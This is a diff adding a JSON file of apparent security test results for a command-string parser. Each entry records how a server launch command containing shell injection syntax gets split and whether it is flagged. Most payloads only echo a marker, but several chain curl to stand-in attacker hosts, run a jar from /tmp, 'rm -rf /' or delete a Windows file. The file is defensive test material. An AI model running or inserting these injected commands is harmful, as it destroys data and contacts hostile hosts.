@@ -1,0 +1,237 @@
+[
+  {
+    "test": "Semicolon Command Injection",
+    "status": "SUSPICIOUS",
+    "command": "npx test-server; echo INJECTED",
+    "result": {
+      "command": "npx",
+      "args": [
+        "test-server;",
+        "echo",
+        "INJECTED"
+      ]
+    }
+  },
+  {
+    "test": "Backtick Command Substitution",
+    "status": "SUSPICIOUS",
+    "command": "npx `echo malicious-server`",
+    "result": {
+      "command": "npx",
+      "args": [
+        "`echo",
+        "malicious-server`"
+      ]
+    }
+  },
+  {
+    "test": "Dollar Command Substitution",
+    "status": "SUSPICIOUS",
+    "command": "npx $(echo malicious-server)",
+    "result": {
+      "command": "npx",
+      "args": [
+        "$(echo",
+        "malicious-server)"
+      ]
+    }
+  },
+  {
+    "test": "Pipe Command Injection",
+    "status": "SUSPICIOUS",
+    "command": "npx test-server | echo INJECTED",
+    "result": {
+      "command": "npx",
+      "args": [
+        "test-server",
+        "|",
+        "echo",
+        "INJECTED"
+      ]
+    }
+  },
+  {
+    "test": "Logical AND Injection",
+    "status": "SUSPICIOUS",
+    "command": "npx test-server && echo INJECTED",
+    "result": {
+      "command": "npx",
+      "args": [
+        "test-server",
+        "&&",
+        "echo",
+        "INJECTED"
+      ]
+    }
+  },
+  {
+    "test": "Logical OR Injection",
+    "status": "SUSPICIOUS",
+    "command": "npx test-server || echo INJECTED",
+    "result": {
+      "command": "npx",
+      "args": [
+        "test-server",
+        "||",
+        "echo",
+        "INJECTED"
+      ]
+    }
+  },
+  {
+    "test": "Background Process Injection",
+    "status": "SUSPICIOUS",
+    "command": "npx test-server & echo INJECTED",
+    "result": {
+      "command": "npx",
+      "args": [
+        "test-server",
+        "&",
+        "echo",
+        "INJECTED"
+      ]
+    }
+  },
+  {
+    "test": "File Redirection Injection",
+    "status": "SUSPICIOUS",
+    "command": "npx test-server > /tmp/injected.txt; echo INJECTED",
+    "result": {
+      "command": "npx",
+      "args": [
+        "test-server",
+        ">",
+        "/tmp/injected.txt;",
+        "echo",
+        "INJECTED"
+      ]
+    }
+  },
+  {
+    "test": "Environment Variable Injection",
+    "status": "SAFE",
+    "command": "INJECTED=true npx test-server",
+    "result": {
+      "command": "INJECTED=true",
+      "args": [
+        "npx",
+        "test-server"
+      ]
+    }
+  },
+  {
+    "test": "Path with Injection Attempt",
+    "status": "SUSPICIOUS",
+    "command": "/Applications/Test.app/bin/java; echo INJECTED",
+    "result": {
+      "command": "/Applications/Test.app/bin/java;",
+      "args": [
+        "echo",
+        "INJECTED"
+      ]
+    }
+  },
+  {
+    "test": "Quoted Injection Attempt",
+    "status": "SUSPICIOUS",
+    "command": "\"npx test\"; echo INJECTED",
+    "result": {
+      "command": "npx test;",
+      "args": [
+        "echo",
+        "INJECTED"
+      ]
+    }
+  },
+  {
+    "test": "Mixed Quotes Injection",
+    "status": "SUSPICIOUS",
+    "command": "npx 'test`echo INJECTED`server'",
+    "result": {
+      "command": "npx",
+      "args": [
+        "test`echo INJECTED`server"
+      ]
+    }
+  },
+  {
+    "test": "Newline Injection",
+    "status": "SUSPICIOUS",
+    "command": "npx test-server\necho INJECTED",
+    "result": {
+      "command": "npx",
+      "args": [
+        "test-server",
+        "echo",
+        "INJECTED"
+      ]
+    }
+  },
+  {
+    "test": "Unicode Special Characters",
+    "status": "SUSPICIOUS",
+    "command": "npx test-server\u0000echo INJECTED",
+    "result": {
+      "command": "npx",
+      "args": [
+        "test-server\u0000echo",
+        "INJECTED"
+      ]
+    }
+  },
+  {
+    "test": "Long Injection Chain",
+    "status": "SUSPICIOUS",
+    "command": "npx test && echo INJECTED && curl http://evil.com && rm -rf /",
+    "result": {
+      "command": "npx",
+      "args": [
+        "test",
+        "&&",
+        "echo",
+        "INJECTED",
+        "&&",
+        "curl",
+        "http://evil.com",
+        "&&",
+        "rm",
+        "-rf",
+        "/"
+      ]
+    }
+  },
+  {
+    "test": "Malicious Java Command",
+    "status": "SUSPICIOUS",
+    "command": "/Applications/Evil.app/Contents/Home/bin/java -jar /tmp/malicious.jar; echo INJECTED && curl http://attacker.com",
+    "result": {
+      "command": "/Applications/Evil.app/Contents/Home/bin/java",
+      "args": [
+        "-jar",
+        "/tmp/malicious.jar;",
+        "echo",
+        "INJECTED",
+        "&&",
+        "curl",
+        "http://attacker.com"
+      ]
+    }
+  },
+  {
+    "test": "Windows Command Injection",
+    "status": "SUSPICIOUS",
+    "command": "npx test-server.exe & echo INJECTED & del C:\\important.txt",
+    "result": {
+      "command": "npx",
+      "args": [
+        "test-server.exe",
+        "&",
+        "echo",
+        "INJECTED",
+        "&",
+        "del",
+        "C:important.txt"
+      ]
+    }
+  }
+]
